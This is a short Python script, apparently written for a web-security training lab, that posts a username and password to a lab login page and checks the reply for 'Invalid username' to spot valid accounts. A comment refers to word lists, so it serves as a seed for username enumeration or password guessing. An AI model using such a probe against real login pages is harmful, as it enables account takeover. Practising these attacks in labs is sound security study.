#!/usr/bin/env python3
import requests

def login_to_website(username, password):
    # Change this with each launch of the lab
    login_url = "https://0a4c00bf039673e580c467c4005400a3.web-security-academy.net/login"

    # Create a session to persist cookies across requests
    session = requests.Session()

    login_data = {
        "username": username,
        "password": password,
        "submit": "Log in"  
    }

    try:
        # Send a POST request to the login page
        response = session.post(login_url, data=login_data)
        print(response)
        # Check for 200 response here, if not then note position in word lists.
        if "Invalid username" in response.text: 
            print(f"Not {login_data['username']} and {login_data['password']}")
        else:
            print(f"{login_data['username']} and {login_data['password']} might be interesting.")

    except requests.RequestException as e:
        print(f"Error during login: {e}")

if __name__ == "__main__":
    # Replace with your actual username and password
    username = "carlos"
    password = "password1"
    login_to_website(username, password)
